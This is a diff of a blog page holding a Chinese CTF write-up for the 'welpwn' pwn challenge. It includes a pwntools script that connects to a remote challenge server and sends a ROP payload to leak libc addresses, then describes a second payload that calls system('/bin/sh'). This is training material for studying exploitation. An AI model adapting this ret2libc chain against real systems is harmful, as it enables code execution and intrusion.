@@ -5,10 +5,11 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="libc64, shellcode等">
-    <meta name="description" content="攻防世界welpwnchecksec
+    <meta name="description" content="checksec
 ![屏幕截图 2025-01-16 114726](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 114726.png)
 NX保护开启
-IDA6">
+IDA64分析
+![屏幕截图">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -394,7 +395,7 @@ IDA6">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    635
+                    648
                 </div>
                 
 
@@ -416,7 +417,7 @@ IDA6">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="攻防世界welpwn"><a href="#攻防世界welpwn" class="headerlink" title="攻防世界welpwn"></a>攻防世界welpwn</h1><p><strong>checksec</strong></p>
+                <p><strong>checksec</strong></p>
 <p>![屏幕截图 2025-01-16 114726](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 114726.png)</p>
 <p>NX保护开启</p>
 <p><strong>IDA64分析</strong></p>
@@ -432,7 +433,7 @@ IDA6">
 <p>64位Linux前六个参数是使用rdi,rsi,rdx,rcs,r8,r9传递的，需要构造两个payload，而且要先pop四次，payload1=’a’*0x18+p64(pop_4)+p64(ROP);</p>
 <p>![屏幕截图 2025-01-16 162420](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 162420.png)</p>
 <p>通过泄露puts和read真实地址寻找libc版本，脚本如下：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os = 'linux', arch = 'amd64', log_level = 'debug')</span><br><span class="line"></span><br><span class="line">r = remote('61.147.171.105',63071)</span><br><span class="line">elf = ELF('./7eff')</span><br><span class="line">libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line">puts_got = elf.got['read']</span><br><span class="line">main_addr = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x4008a3</span><br><span class="line">pop_4 = 0x40089c</span><br><span class="line"></span><br><span class="line">payload = b'a' * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter('RCTF\n',payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))</span><br><span class="line"></span><br><span class="line">print("puts_real_addr:",hex(puts_real_addr))</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os = 'linux', arch = 'amd64', log_level = 'debug')</span><br><span class="line"></span><br><span class="line">r = remote('61.147.171.105',63071)</span><br><span class="line">elf = ELF('./7eff')</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line">puts_got = elf.got['read']</span><br><span class="line">main_addr = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x4008a3</span><br><span class="line">pop_4 = 0x40089c</span><br><span class="line"></span><br><span class="line">payload = b'a' * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter('RCTF\n',payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))</span><br><span class="line"></span><br><span class="line">print("puts_real_addr:",hex(puts_real_addr))</span><br></pre></td></tr></tbody></table></figure>
 
 <p>把read改为puts，就可以得到puts的真实地址。read和puts的真实地址是变化的，但后三位是不变的，根据其可以筛选出libc版本，并将其下载。</p>
 <p>![屏幕截图 2025-01-16 170856](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 170856.png)我们可以通过puts真实地址-偏移得到libc的基地址，从而可以计算出system和/bin/sh,进而构造payload2 = b’a’ * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)</p>
@@ -442,6 +443,8 @@ IDA6">
 
 
 <p>![屏幕截图 2025-01-16 171231](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 171231.png)</p>
+<p><strong>堆栈平衡</strong></p>
+<p>用ROP链找到ret，然后在填充垃圾数据后加上p64(ret)</p>
 
                 
             </div>
@@ -582,18 +585,17 @@ IDA6">
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2025/01/18/libc64/">
+                <a href="/2025/01/19/libc32/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="libc64">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="libc32">
                         
-                        <span class="card-title">libc64</span>
+                        <span class="card-title">libc32</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -603,9 +605,9 @@ IDA6">
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-18
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-19
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -614,7 +616,6 @@ IDA6">
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
